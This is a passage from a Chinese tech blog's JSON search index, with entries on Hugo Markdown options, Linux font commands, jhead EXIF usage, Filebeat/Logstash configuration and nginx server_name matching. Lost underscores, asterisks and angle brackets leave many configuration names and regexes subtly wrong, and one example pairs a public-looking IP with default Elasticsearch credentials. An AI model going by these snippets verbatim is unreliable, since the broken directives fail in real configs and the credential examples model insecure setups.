true。控制是否开启标点符号（双引号、分子符号、连字符）的转换。\nangledQuotes，默认为 false。控制是否将中文双引号 “hugo” 转换为 «hugo»。\nfractions，默认为 true。控制是否将分子式 5/7 转换为 HTML 格式 sup5/sup\u0026frasl;sub7/sub。\nsmartDashes 和 latexDashes 共同控制多个连字符如何转换为 – 和 —。\nhrefTargetBlank，默认为 false。控制打开外部链接时是否打开新的浏览器窗口。\nplainIDAnchors，默认为 true。不向标题内容添加文档 ID。\nextensions，是列表项。包含于该列表中的 Blackfriday Markdown 扩展语法标识，将开启对应的扩展语法的支持。\nextensionsmask，是列表项。包含于该列表中的 Blackfriday Markdown 扩展语法标识，将关闭对应的扩展语法的支持。\n\n扩展语法支持\n\nHugo 的 Blackfriday 解释器扩展了核心的 Markdown 语法，下面将介绍一些常用的扩展语法，更多扩展参见官网\n\n禁止解析单词内的下划线\n\n  扩展语法标识为：noIntraEmphasis，默认开启该扩展。由于 ` 字符是 Markdown 语法的组成部分，所以如果代码中出现类似 initpriority_list` 这样的内容，将会被误当成 Markdown 语法来解析。\n\n开启对表格语法的支持\n\n  扩展语法标识为：tables，默认开启该扩展。表格语法如下\n\n       Name | Age","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux字体(fonts)设置","title":"Linux字体设置","text":"---\n  \n  \nadobe-fonts  \n\nfonts.conf 中文手册  \nUbuntu Chrome 中文字体发虚  \n解决LinuxMint/Ubuntu中文字体发虚的根本之道  \nHow To Install New Fonts In Ubuntu 14.04 and 14.10  \n  \n字体下载  \n字体口袋  \n################################################################################\n常用命令\nfc-list 查看已安装字体\nfc-match sans-serif #抓取当前用户sans-serif类字体优先级最高的那款字体\nfc-match serif #抓取当前用户serif类字体优先级最高的那款字体\nfc-match monospace #抓取当前用户monospace类字体优先级最高的那款字体\n\n字体安装 Install\nsudo apt-get install ttf-wqy-*\n\nsudo apt-get remove fonts-noto-cjk 思源黑体\nsudo apt-get remove fonts-arphic-ukai fonts-arphic-uming\n\ngsettings set org.gnome.desktop.interface font-name 'THE FONT NAME 11'\ngsettings set org.gnome.desktop.interface document-font-name 'THE FONT NAME 11'\nsetting\nsudo fc-cache -f -v\n 字体相关目录\nsudo fc-cache -fv\n/usr/share/fonts/ \t\t#系统默认字体目录\n/usr/local/share/fonts\t#空\n~/.local/share/fonts \t#安装字体目录\n~/.fonts\t\t\t\t\t\t\t\t#空\n\nSource Code Pro\nDejaVu Sans Mono\nInconsolata\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 jhead命令详解EXIF","title":"jhead命令详解 依据EXIF照片自动旋转","text":"玩转照片EXIF信息的利刃：jhead命令详解 依据EXIF照片自动旋转 - yming0221 - 博客园\n\njhead是一个处理照片exif信息的命令行工具。\n\n它的强大在于它\n一、提供了其他工具所不能企及的功能\n二、强大的批处理能力\n\n据说该工具最早是在linux环境下开发的，现已被移植到多个平台，包括windows。\n但，目前为止并没有GUI，也就是图形外壳，所以理解并使用该工具前你必须了解一些简单的命令行知识..........\n\n跟所有的命令行工具一样，它的使用方法为：jhead 参数列表 jpg文件列表\n比如：\njhead -se 1.jpg..................................处理单个文件\njhead -se 2009[0-9].jpg.................处理指定的多个文件\njhead -se .jpg...................................处理所有文件\n另外，你甚至可以用通配符来代替子目录，从而实现对指定目录的遍历！包括子目录的子目录。如：\njhead -se c:/tmp//.jpg\n\n当然有些参数也允许你联合使用。比如：\njhead -se -q 1.jpg 2.jpg 3.jpg\n\n显示jhead版本、获得帮助\n-V(大写的V)...............显示jhead的版本\n-h...............................获得帮助\n\n提示：由于jhead的帮助较长，管道输出可能更适合你阅读。如：jhead -h | more\n旋转照片\n-autorot...................................根据exif中记录的水平方向信息转动照片\n-norot................... ...................清除exif中记录的水平方向信息\n\njhead的照片旋转是据于照片的exif旋转标志进行的，通常是前期竖拍的照片，横拍的照片它会自动跳过不予处理，同时自动清除旋转标志，并不需要再做一次norot操作。\n处理过的照片会跟横拍一样，在windowsXP及以更老的系统里，得到正常浏览。\n\n放心，jhead对照片的旋转是无损的。\n\njhead的强大在于它支持通配符处理模式，从而实现批处理，所以很多时候对单张照片进行旋转是没有意义的。\n另外，它的处理效率不是光影等其他第三方软件所能比拟的！\n不过，这一功能在windows7里已经得到了实现，用windows7系统自带的照片导入功能，会实现对前期竖拍照片的自动旋转，功能一样。\n\n我们来看一下实例吧..........\n\n对当前目录下的所有jpg文件进行转动 jhead -autorot .jpg\n显示照片的exif信息\n-v（小写的v）........................详细的exif信息显示\n-exifmap.................................显示头信息，总之跟v不一样\n-se...........................................简化显示\n-c..............................................精简显示（比-se更简单）\n\n提示：\n有时候你可能需要把照片的exif信息转入文体保存，你可以直接重定向输出就可以了\n比如：jhead -se ldpic.jpg  a.txt\n\n处理exif信息（一）\n-dc..........................删除jpg信息中的备注\n-de.........................完全删除exif信息\n-du.........................删除非原始exif信息,例如Photoshop之类编辑后修改exif留下的信息\n-purejpg................删除所有jpg文件非必须信息. 相当于-de -dc -du的集合,文件将减小数k\n-mkexif..................创建新的最小exif信息(覆盖原有的的exif信息)，不明白这有什么用\n-di..........................删除IPTC (Photoshop 格式兼容) 信息.\n-dx.........................删除XMP (photoshop文件信息)\n\n说明：\n参数很简单，不需要详解了。但-du和-mkexif有时并不管用，不知为何......试过很多方法，只有期待高手了\n\n清除当前目录下所有jpg文件的exif信息......\njhead -purejpg .jpg\n处理exif信息（二）\n\n-te.........................................从其他jpg文件导入exif信息到当前文件\n你可以单个文件导入\n如：jhead -te 01.jpg 02.jpg 把01.jpg的信息导入到02.jpg，覆盖原来的。\n也可以批量导入\n如：jhead -te \"bak/\u0026i\" .jpg 把bak目录下的jpg文件信息按文件名一一对应的导入当前目录下的jpg文件！引号不省略！！\n据说之一功能最常用的是在照片PS完后，再导入它原生的信息\n处理exif信息（三）\n-dc...............删除jpg信息中的备注.\n-ce..............使用系统默认编辑器编辑备注。运行时会自动打开文本编辑器，录完信息，保存并关闭后，信息会自动被写入备注\n-cs...............导出备注到文本文件。 如：jhead -cs 1.txt 1.jpg\n-ci................从文体文件导入备注。如： jhead -ci 1.txt 1.jpg\n-cl string.....直接输入备注。如： jhead –cl 我爱无常版主 1.jpg\n\n提示：\nexif中的备注不同于windows给文件所做的备注，一般的软件会看不到，包括光影，但还是不少软件能阅读，如：Exifer\n\n缩略图\n-dt................................删除exif中的缩略图. 此缩略图一般240x160象素,10k大小\n-st [name]..................将exif中的缩略图复制为另一个jpg文件\n-rt [name]...................用另一个jpg文件替换exif中的缩略图.\n-rgt[size].....................刷新exif缩略图,其中[size]为缩略图的最大边长.\n\n提示：\n-rgt功能的实现是调用第三方应用程序mogrify.exe，所以你之前必须下载并安装之一程序！在jhead官方网站有链接。\n但这一功能好像不是对所有的jpg文件都管用，找不出原因\n\n实例：\njhead -st \"bak/\u0026i\" .jpg\n把当前目录下的所有文件的缩略图复制保存到bak目录下并与原文件名同名。\n修改时间与文件改名\n-ft................................将jpg文件的“修改时间”修改为exif信息中记录的拍摄时间\n-dsft...........................把照片exif信息时间设置为文件修改时间.\n-da[date1]-[date2]...把拍摄日期为data2的照片日期修正为data1;date格式为yyyy:mm:dd或yyyy:mm:dd+hh:mm或yyyy:mm:dd+hh:mm:ss\n-ts[time]....................直接修改exif中的时间,格式为yyyy:mm:dd-hh:mm:ss\n-ds[date]...................直接修改exif中的日期,格式为yyyy:mm:dd 或yyyy:mm 或yyyy\n-ta[+|-]h[:mm[:ss]]...修正时差,根据时区确定,例如+1:00或者-1:00\n\n-n[format-string]......将照片文件名修改为exif信息中记录的“数字化时间”，保留原文件名; 如果exif数字化时间不可用,则将文件名修改为文件的“修改时间”\n\n-nf [format-string].... 与\"-n\"相同功能相同,不保留原文件名\n\nformat-string格式说明\n%d................日.................................(01-31)\n%H...............小时.............................(00-23)\n%j.................一年中的第几天.........(001-366)\n%m..............月.................................(01-12)\n%M...............分钟.............................(00-59)\n%S...............秒.................................(00-59)\n%U..............一年中的第几周..........(00-53)\n%w..............星期几..........................(0-6,周日为0)\n%y................两位数纪年..................(00-99)\n%Y...............四位数纪年\n%i................添加数字序号，也可以指定位数。如：%04i（生成4位序号，不足的高位补零）\n%f................原文件名\n\n提示：\n照片中exif信息记录的时间有三个分别是：拍摄时间、数字化时间(也有叫创建时间的)和修改时间这些时间记录与windows中有关文件时间是不一样的，两码事！\njhead对照片日期的修改是同步修改这三个时间！！！\n\n现在我们举几个例子：\n\n（一）jhead -da2009:01:01-2008:01:01 .jpg\n把当前目录下的所有拍摄日期为2008/01/01的照片更改时间为2009/01/01。这在相机日期设置有误时非常有用。\n\n（二）jhead -ds2009 .jpg\n把当前目录下的所有jpg文件的日期年份更改为2009年，保持日期的其他部分（月、日及时间）不变！\n\n（三）jhead -nf%Y%m%d%04i .jpg\n把当前目录下的所有jpg文件的文件名更改为:年4位月2位日2位4位序号.jpg 如：200912010001.jpg\n最后。。。\n其他几个参数....................\n\n-q....................................不显示程序运行信息，和其他参数一起使用。这在编写批处理脚本时非常有用\n-cmd command...........调用其他程序，如：jhead -cmd \"mogrify -quality 80 \u0026i\" .jpg\n-exonly............................不处理没有exif信息的文件，要和其他参数一起使用\n-a....................................修改不同扩展名的同名文件名。拍摄的avi短片exif信息存储在同名thm文件中,可用此指令给avi文件更名. 一般与-n共同使用.\n\n另外还有其他几个参数，由于不甚了了，就不一一介绍了，你可以自己查阅原文的帮助信息。","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone支持email","title":"drone支持ansible","text":"https://github.com/Drillster/drone-email","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang API网管tyk","title":"golang扩展 tyk","text":"http://www.cnblogs.com/lazio10000/p/5281905.html","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Beats配置详解","title":"Beats配置详解","text":"使用 pipelines\noutput.elasticsearch:\n  hosts: [\"${hotname}:80\"]\n  template.enabled: true\n  template.path: \"filebeat.template.json\"\n  template.overwrite: false\n  index: \"cs-email\"\n  pipelines:\n   # - pipeline: criticalpipeline\n   #   when.equals:\n   #     type: \"critical\"\n   # - pipeline: normalpipeline\n   #   when.equals:\ntype: \"normal\"\n\noutput.elasticsearch:\n  hosts: [\"http://localhost:9200\"]\n  username: \"admin\"\n  password: \"s3cr3t\"\n  template.enabled: true\n  template.fields: \"fields.yml\"\n  template.overwrite: false\n  index: \"{beatnamelc}\"\n  ssl.certificateauthorities: [\"/etc/pki/root/ca.pem\"]\n  ssl.certificate: \"/etc/pki/client/cert.pem\"\n  ssl.key: \"/etc/pki/client/cert.key\"\n\n./scripts/importdashboards -es http://120.92.36.21:9200 -user elastic -pass changeme\n-E setting=value\n\n   Override a specific configuration setting. For example:\n\n   sudo ./metricbeat -c metricbeat.yml -E name=mybeat\n\n   This setting is applied to the currently running Metricbeat process. The Metricbeat configuration file is not changed.\n-N\n   Disable the publishing of events to the defined output. This option is useful only for testing the Beat.\n-c file\n   Pass the location of a configuration file for the Beat.\n-configtest\n   Test the configuration file and then exit. This option is useful for troubleshooting the configuration of a Beat.\n\n-d selectors\n   Enable debugging for the specified selectors. For the selectors, you can specify a comma-separated list of components, or you can use -d \"\" to enable debugging for all components. For example, -d \"publish\" displays all the \"publish\" related messages.\n-e\n   Log to stderr and disable syslog/file output.\n\n-path.config\n   Set the default location for configuration (e.g. the Elasticsearch template). See the Directory Layout section for details.\n-path.data\n   Set the default location for data files. See the Directory Layout section for details.\n-path.home\n   Set the default location for miscellaneous files. See the Directory Layout section for details.\n-path.logs\n   Set the default location for log files. See the Directory Layout section for details.\n-setup\n   Load the sample Kibana dashboards. By default, this downloads an archive file containing the Beats dashboards from the elastic.co website. See the Dashboards section for more details and more options.\n-v\n   Enable verbose output to show INFO-level messages.\n-version\n   Display the Beat version and exit.\nfilebeats 配置\nFilebeat 发送的日志，会包含以下字段：\n\n    beat.hostname beat 运行的主机名\n    beat.name shipper 配置段设置的 name，如果没设置，等于 beat.hostname\n    @timestamp 读取到该行内容的时间\n    type 通过 documenttype 设定的内容\n    inputtype 来自 \"log\" 还是 \"stdin\"\n    source 具体的文件名全路径\n    offset 该行日志的起始偏移量\n    message 日志内容\n    fields 添加的其他固定字段都存在这个对象里面\npaths：指定要监控的日志，目前按照Go语言的glob函数处理。没有对配置目录做递归处理，比如配置的如果是：\n\n/var/log/ /.log\n则只会去/var/log目录的所有子目录中寻找以”.log”结尾的文件，而不会寻找/var/log目录下以”.log”结尾的文件。\n\nencoding：指定被监控的文件的编码类型，使用plain和utf-8都是可以处理中文日志的。\n\ninputtype：指定文件的输入类型log(默认从文件中读取)或者stdin。\ndocumenttype：设定Elasticsearch输出时的document的type字段，也可以用来给日志进行分类。 当未指定时使用inputtype设定值\n\nexcludelines：在输入中排除符合正则表达式列表的那些行。\nincludelines：包含输入中符合正则表达式列表的那些行（默认包含所有行），includelines执行完毕之后会执行excludelines。\n\nexcludefiles：忽略掉符合正则表达式列表的文件（默认为每一个符合paths定义的文件都创建一个harvester）。\nfields：向输出的每一条日志添加额外的信息，比如“level:debug”，方便后续对日志进行分组统计。默认情况下，会在输出信息的fields子目录下以指定的新增fields建立子目录，例如fields.level。\nfieldsunderroot：如果该选项设置为true，则新增fields成为顶级目录，而不是将其放在fields目录下。自定义的field会覆盖filebeat默认的field。例如添加如下配置：\nfields:\nlevel: debug\nfieldsunderroot: true\n\nignoreolder：可以指定Filebeat忽略指定时间段以外修改的日志内容，比如2h（两个小时）或者5m(5分钟)。\ncloseolder：如果一个文件在某个时间段内没有发生过更新，则关闭监控的文件handle。默认1h,change只会在下一次scan才会被发现\nforceclosefiles：Filebeat会在没有到达closeolder之前一直保持文件的handle，如果在这个时间窗内删除文件会有问题，所以可以把forceclosefiles设置为true，只要filebeat检测到文件名字发生变化，就会关掉这个handle。\nscanfrequency：Filebeat以多快的频率去prospector指定的目录下面检测文件更新（比如是否有新增文件），如果设置为0s，则Filebeat会尽可能快地感知更新（占用的CPU会变高）。默认是10s。\n\nharvesterbuffersize：每个harvester监控文件时，使用的buffer的大小。\nmaxbytes：单行日志最大字节,多余丢弃;日志文件中增加一行算一个日志事件，maxbytes限制在一次日志事件中最多上传的字节数，多出的字节会被丢弃。\n\nmultiline：适用于日志中每一条日志占据多行的情况，比如各种语言的报错信息调用栈。这个配置的下面包含如下配置：\nmultiline 合并多行日志为一行：  当然在logstash input中使用codec multiline设置是一样的\n        pattern：匹配规则，这里指匹配每条日志开始的年份；\n        negate： 是否开始一个新记录，这里指当pattern匹配后，结束之前的记录，创建一条新日志记录；默认false\n        match：  有before与after，这里指从该行开始向后匹配；\n\nnegate：默认是false，正则匹配的行合并到上一行；\n        true，不匹配pattern的行合并到上一行\nmatch： after 或 before，匹配合并到上一行的末尾或下一行开头\n\n         negate \tmatch \tResult\n        [false   before  匹配中 之前的行 新建到下一行 (用来匹配 多行开始的行)]\n        [false   after   匹配中 之后的行 追加到上一行 (用来匹配 多行结束的行)]\n\n        true    after    不匹配 之前的行 追加到上一行    \n        true    before   不匹配 之后的行 追加到下一行\n\ntailfiles：如果设置为true，Filebeat从文件尾开始监控文件新增内容，把新增的每一行文件作为一个事件依次发送，而不是从文件开始处重新发送所有内容。\nbackoff：Filebeat检测到某个文件到了EOF之后，每次等待多久再去检测文件是否有更新，默认为1s。\nmaxbackoff：Filebeat检测到某个文件到了EOF之后，等待检测文件更新的最大时间，默认是10秒。\nbackofffactor：定义到达maxbackoff的速度，默认因子是2，到达maxbackoff后，变成每次等待maxbackoff那么长的时间才backoff一次，直到文件有更新才会重置为backoff。\n如果设置成1，意味着去使能了退避算法，每隔backoff那么长的时间退避一次。\nspoolsize:spooler的大小，spooler中的事件数量超过这个阈值的时候会清空发送出去（不论是否到达超时时间）。\nidletimeout:spooler的超时时间，如果到了超时时间，spooler也会清空发送出去（不论是否到达容量的阈值）。\nregistryfile:记录filebeat处理日志文件的位置的文件\nconfigdir:如果要在本配置文件中引入其他位置的配置文件，可以写在这里（需要写完整路径），但是只处理prospector的部分。\npublishasync：是否采用异步发送模式（实验功能）。\nfilebeat 处理json\nfilebeat.prospectors:\npaths:\n    input.json\n  multiline.pattern: '^{'\n  multiline.negate: true\n  multiline.match:  after\n\nprocessors:\ndecodejsonfields:\n    fields: ['message']\n    target: json\n\noutput.console.pretty: true\n\nfilebeat:\n    spoolsize: 1024                                     最大可以攒够 1024 条数据一起发送出去\n    idletimeout: \"5s\"                                  # 否则每 5 秒钟也得发送一次\n    registryfile: \".filebeat\"                          # 文件读取位置记录文件，会放在当前工作目录下。所以如果你换一个工作目录执行 filebeat 会导致重复传输！\n    configdir: \"path/to/configs/contains/many/yaml\"    # 如果配置过长，可以通过目录加载方式拆分配置\n    prospectors:                                        # 有相同配置参数的可以归类为一个 prospector\n\n        fields:\n                ownfield: \"mac\"                         # 类似 logstash 的 addfields\n            paths:\n                /var/log/system.log                   # 指明读取文件的位置\n                /var/log/wifi.log\n            includelines: [\"^ERR\", \"^WARN\"]            # 只发送包含这些字样的日志\n            excludelines: [\"^OK\"]                      # 不发送包含这些字样的日志\n        documenttype: \"apache\"                     # 定义写入 ES 时的 type 值\n            ignoreolder: \"24h\"                         # 超过 24 小时没更新内容的文件不再监听。在 windows 上另外有一个配置叫 forceclosefiles，只要文件名一变化立刻关闭文件句柄，保证文件可以被删除，缺陷是可能会有日志还没读完\n            scanfrequency: \"10s\"                       # 每 10 秒钟扫描一次目录，更新通配符匹配上的文件列表\n            tailfiles: false                           # 是否从文件末尾开始读取\n            harvesterbuffersize: 16384                # 实际读取文件时，每次读取 16384 字节\n            backoff: \"1s\"                               # 每 1 秒检测一次文件是否有新的一行内容需要读取\n            paths:\n                \"/var/log/apache/\"                   # 可以使用通配符\n            excludefiles: [\"/var/log/apache/error.log\"]\n        inputtype: \"stdin\"                         # 除了 \"log\"，还有 \"stdin\"\n            multiline:                                  # 多行合并\n                pattern: '^[[:space:]]'\n                negate: false\n                match: after\n\nfilebeat.prospectors:\ninputtype: log\n  paths: [\"/var/log/*/.log\"]\n  multiline.pattern: '^['\n  multiline.match: after\n  \nfilebeat.prospectors:\ndocumenttype: tomcat\n  paths:\n    /var/log/java/log #日志文件地址\n  inputtype: log #从文件中读取\n  tailfiles: true #以文件末尾开始读取数据\n  multiline:\n    pattern: ^\\d{4}\n    match: after\n    negate: true\n\nlogstash中FILTERS配置\n\nfilter {\n\tif [type] == \"tomcat\" {\n\t\tgrok{\n\t\t\tmatch =  { \"message\" =  \"%{TIMESTAMPISO8601:timestamp} %{LOGLEVEL:level} %{JAVALOGMESSAGE:msg}\" }\n\t\t}\n\n\t\tdate {\n\t   \t\tmatch =  [ \"timestamp\" , \"yyyy-MM-dd HH:mm:ss,S\", \"ISO8601\" ]\n\t\t}\n\t}\n\n}\n\n############################################\nfilters:\n    dropevent:\n        regexp:\n            message: \"^DBG:\"\n    dropfields:\n        contains:\n            source: \"test\"\n        fields: [\"message\"]\n    includefields:\n        fields: [\"http.code\", \"http.host\"]\n        equals:\n            http.code: 200\n        range:\n            gte:\n                cpu.userp: 0.5\n            lt:\n                cpu.userp: 0.8\n可用的条件判断包括：[ equals contains regexp range or and not]\n\noutput\n\n目前 beat 可以发送数据给 Elasticsearch、Logstash、File、Kafka、Redis 和 Console 六种目的地址。\nElasticsearch\n\nbeats 发送到 Elasticsearch 也是走 HTTP 接口。示例配置段如下：\n\noutput:\n    elasticsearch:\n        hosts: [\"http://120.92.36.21:9200\", \"https://onesslip:9200/path\", \"anotherip\"]\n        parameters: {pipeline: mypipelineid}                         # 仅用于 Elasticsearch 5.0 以后的 ingest 方式\n        username: \"user\"\n        password: \"pwd\"\n        index: \"topbeat\"\n        bulkmaxsize: 20000\n        flushinterval: 5\n        tls:\n            certificateauthorities: [\"/etc/pki/root/ca.pem\"]\n            certificate: \"/etc/pki/client/cert.pem\"\n            certificatekey: \"/etc/pki/client/cert.key\"\n\n    hosts 中可以通过 URL 的不同形式，来表示 HTTP 还是 HTTPS，是否有添加代理层的 URL 路径等情况。\n    index 表示写入 Elasticsearch 时索引的前缀，比如示例即表示索引名为 topbeat-yyyy.MM.dd\n\nfilebeat --  logstash\n\n下面是一个简单的Filebeat配置，采集2个文件夹下的日志并转发至Logstash。\n\nfilebeat:\n  prospectors:\n    paths:\n        /dir1/accesslog.\n      inputtype: log\n      documenttype: dir1log\n    paths:\n        /dir2/ofbiz.log.\n      inputtype: log\n      documenttype: dir2log\noutput:\n  logstash:\n    hosts: [\"10.90.4.9:5044\"]\n\n在Logstash中根据 documenttype定义解析日志的正则并输出到ELasticsearch集群。\n\ninput {\n    beats{\n     host =  \"192.2.11.145\"\n     port =  5044\n   }\n}\nfilter {\n  if[type]==\"dir1log\"{\n    grok {\n        match =  { \"message\" =  \"%{COMBINEDAPACHELOG}\"}\n    }\n  } else if ([type]==\"dir2log\") {\n    grok {\n        match =  { \"message\" =  \"%{TIMESTAMPISO8601:time}\\s%{NUMBER:logtime} \\[\\s%{JAVAFILE:class}\\:%{NUMBER:lineNumber}\\s\\:%{LOGLEVEL:level}\\s\\]\\s(?info([\\s\\S]))\"}\n    }\n  }\n}\noutput {\n    elasticsearch {\n      hosts =  [\"10.90.4.9\",\"10.90.4.8\",\"10.90.4.7\"]\n    }\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx server_name","title":"Linux命令 Nginx","text":"Server names\nnginx 的 server names - 简书\n目录：\n\n    通配符主机名\n    正则表达式主机名\n    混杂主机名\n    对主机名的优化\n    兼容性\n\nnginx 的 server names 由 servername 指令定义，server name 是 nginx 用于选择以哪个 server 区块处理访问请求的依据参数。可参考 《nginx 是如何处理请求的》 的描述。\n\nserver name 可以用三种方式定义：\n\n    定义准确的名字\n    定义通配符名字\n    定义正则表达式名字\n\n例如：\n\nserver {\n    listen       80;\n    servername  example.org  www.example.org;\n    ...\n}\n\nserver {\n    listen       80;\n    servername  .example.org;\n    ...\n}\n\nserver {\n    listen       80;\n    servername  mail.;\n    ...\n}\n\nserver {\n    listen       80;\n    servername  ~^(?user.+)\\.example\\.net$;\n    ...\n}\n\n当 nginx 以请求的 server name 查找匹配的虚拟主机时，如果匹配的 server 区块不止一个，nginx 按照如下的优先顺序选择 server 区块：\n\n    准确的主机名\n    以 “” 起始的最长的通配主机名\n    以 “” 结尾的最长的通配主机名\n    第一个匹配的正则表达式（按照配置文件中的顺序）\n\n所以，如果同时有一个通配主机名和正则表达式主机名与访问请求的 server name 匹配，nginx 会选择通配主机名的 server 区块处理请求。\n通配主机名\n\n通配主机名只能在起始和末尾使用 “” 字符，而且必须以 “.” 分隔。形如 “www..example.org” 或者 “w.example.org” 的通配主机名是无效的。要达到这个匹配效果，只有使用正则表达式：\n\n“www..example.org” -  “~^www\\..+\\.example\\.org$”\n“w.example.org”    -  “~^w.\\.example\\.org$”\n\n“” 号可以匹配多个名字区域，“.example.org” 不仅可以匹配 www.example.org，也能够匹配 www.sub.example.org。\n正则表达式主机名\n\nnginx 使用的正则表达式与 Perl 语言的正则表达式（PCRE）兼容。使用正则表达式主机名，server name 必须以 “~” 字符为起始字符。\n\nservername  ~^www\\d+\\.example\\.net$;\n\n如果不以 “~” 字符为起始字符，该 server name 将被视为 “准确的主机名” 或者当 server name 包含 “” 时被视为 “通配主机名” (多数情况是非法通配主机名，因为只有当 “” 在 server name 的起始或结尾时才合法)。\n\n不要忘记设置 “^” 和 “$” 锚定符对主机名进行界定，这不是 nginx 的配置语法要求，而是为了使正则表达式能正确匹配。\n\n同时也要注意，域名的分隔符 “.” 在正则表达式中应该以 “\\” 引用。如果在正则表达式中使用了 “{” 和 “}” 字符，应该将整个正则表达式引用起来，因为花括弧在 nginx 配置中也有特殊意义，引用起来以避免被 nginx 错误解析。例如：\n\nservername  \"~^(?name\\w\\d{1,3}+)\\.example\\.net$\";\n\n如果不引用起来，nginx 会启动失败，并显示如下错误信息：\n\ndirective \"servername\" is not terminated by \";\" in ...\n\n正则表达式的 named capture （使用一个名字对匹配的字符串进行引用）可被视为一个变量，在后面的配置中使用：\n\nserver {\n    servername   ~^(www\\.)?(?domain.+)$;\n\n    location / {\n        root   /sites/$domain;\n    }\n}\n\nPCRE 库支持 named capture，有如下几种语法：\n\n?name        Perl 5.10 compatible syntax, supported since PCRE-7.0\n?'name'        Perl 5.10 compatible syntax, supported since PCRE-7.0\n?Pname    Python compatible syntax, supported since PCRE-4.0\n\n可参考：pcre2pattern：\n\n \\d     any decimal digit\n \\D     any character that is not a decimal digit\n \\h     any horizontal white space character\n \\H     any character that is not a horizontal white space character\n \\s     any white space character\n \\S     any character that is not a white space character\n \\v     any vertical white space character\n \\V     any character that is not a vertical white space character\n \\w     any \"word\" character\n \\W     any \"non-word\" character\n\n如果 nginx 启动失败，并显示如下信息：\n\npcrecompile() failed: unrecognized character after (?\u003c in ...\n\n这表示 PCRE 库太老旧，可尝试使用 “?Pname” 替代 “?name”。\n\nnamed capture 也能以数字形式使用：\n\nserver {\n    servername   ~^(www\\.)?(.+)$;\n\n    location / {\n        root   /sites/$2;\n    }\n}\n\n无论如何，数字形式的使用应尽量简单，因为数字是只是顺序标识，而不是被匹配的字符串的标识，这导致数字引用很容易被覆盖。\n混杂主机名\n\n有一些主机名是被特殊对待的。\n\n对于未定义 “Host” 请求首部的请求，如果希望在某个 server 区块中处理这样的请求，应在 servername 指令的参数中添加 \"\" 空字符串参数：\n\nserver {\n    listen       80;\n    servername  example.org  www.example.org  \"\";\n    ...\n}\n\n在《nginx 是如何处理访问请求的》一文中曾经介绍过，如果 server 区块中没有定义 servername 指令，便如同定义了 servername \"\"。\n\nNote:\n在 0.8.48 版以前，遇到 server 区块中没有定义 servername 指令的情况，\n会将系统的主机名设置为 server 区块的 server name，而不是自动设置 \"\" 为\nserver name。\n\n在 0.9.4 版本，如果设置：servername $hostname，会将系统的主机名设置为 server name。\n\n如果某个访问使用了 IP 地址 而不是 server name，“Host” 请求首部会包含 IP 地址。对于这样的请求，可使用如下的配置：\n\nserver {\n    listen       80;\n    servername  example.org\n                 www.example.org\n                 \"\"\n                 192.168.1.1\n                 ;\n    ...\n}\n\n下面是一个 catch-all server 区块的配置，使用了 “” 作为 server name:\n\nserver {\n    listen       80  defaultserver;\n    servername  ;\n    return       444;\n}\n\n这个 server name 并没有什么特殊之处，它仅是一个无效的域名而已，也可以使用其他类似的名字，如 “--” and “!@#” 。\n\n0.6.25 版以前的 nginx 曾经支持一个特殊的 server name: “”，这个特殊主机名被错误的解释成一个 catch-all 主机名。但它从未以一个 catch-all 或者 通配主机名工作，它的功能实际上与现在的 servernameinredirect 指令的功能相同：servernameinredirect\n\n特殊的 server name “” 现在已经被弃用，应使用 servernameinredirect 指令。\n\n要注意的是，使用 servername 指令无法指定 defalt server 或是 catch-all name，这是 listen 指令的属性，不是 servername 指令的属性。可参考《nginx 是如何处理访问请求的》。\n\n我们可以定义两个 server，它们都同时监听于 :80 端口 和 :8080 端口，将其中一个设置为 :80 端口的默认 server，将另一个设置为 :8080 端口的默认 server：\n\nserver {\n    listen       80;\n    listen       8080  defaultserver;\n    servername  example.net;\n    ...\n}\n\nserver {\n    listen       80  defaultserver;\n    listen       8080;\n    servername  example.org;\n    ...\n}\n\n对主机名的优化\n\n准确的主机名、以 “” 起始的通配主机名、以 “” 结尾的通配主机名，这三种主机名被存放在三个 hash table 中。这三个 hash table 是与监听端口绑定的。hash table 的大小在配置阶段被优化，优化的目的是努力降低这些名字在 CPU 缓存中命中失败的几率。关于设置 hash table 的详细讨论请参考：hash\n\n在匹配主机名时，首先查找“准确主机名”的 hash table，如果没有找到，会查找以 “” 起始的“通配主机名”的 hash table，如果没有仍未找到，会查找以 “” 结尾的“通配主机名”的 hash table。\n\n对于“通配主机名”的 hash table 的检索会更慢，因为是以主机名的域名部分去检索的。\n\n注意，对于特殊的通配主机名，形如 “.example.org”，这样的主机名是存放在“通配主机名”的 hash table 中，而不是存放在“准确主机名”的 hash table 中。\n\n如果前面都未找到，正则表达式会按写在配置文件中的顺序被测试，因此正则表达式是最慢的方法，并且没有可扩展性。\n\n因为以上这些原因，在可能的情况下最好使用 “准确的主机名”。例如，如果对于 example.org 和 www.example.org 的请求最为频繁，对他们进行显式的定义会更有效率：\n\nserver {\n    listen       80;\n    servername  example.org  www.example.org  .example.org;\n    ...\n}\n\n下面的定义方法不如上面的配置有效率：\n\nserver {\n    listen       80;\n    servername  .example.org;\n    ...\n}\n\n如果定义了大量的主机名，或者使用了很长的主机名，应在配置文件的 http context 中调整这个两个参数：\n\n    servernameshashmaxsize\n    servernameshashbucketsize\n\nservernameshashbucketsize 指令的默认值可能为 32 或 64 或 其他数字，这是根据 CPU 缓存线大小而定的。如果默认值为 32，而且定义了一个 server name 为：“too.long.server.name.example.org” 这时 nginx 就不能启动，而且显示如下的错误信息：\n\ncould not build the servernameshash,\nyou should increase servernameshashbucketsize: 32\n\n遇到这种情况，应将默认值设置为原来的两倍：\n\nhttp {\n    servernameshashbucketsize  64;\n    ...\n\n如果定义了大量的主机名，可能显示如下的错误信息：\n\ncould not build the servernameshash,\nyou should increase either servernameshashmaxsize: 512\nor servernameshashbucketsize: 32\n\n遇到这种情况，首先尝试调整 servernameshashmaxsize 的值，设置为大于 server name 总数的值。如果这样设置仍不能让 nginx 正常启动，或者 nginx 启动的时间变得过长，再尝试增加 servernameshashbucketsize 的值。\n\n如果一个 server 是某个监听端口唯一的 server，这时 nginx 根本不会去测试 server name，同时也不会为该监听端口构建 hash table。但其中又有一个例外，如果 server name 是正则表达式，而且正则表达式中包含了 captures，这时 nginx 不得不执行该正则表达式以获取 captures。（正则表达式的 capture 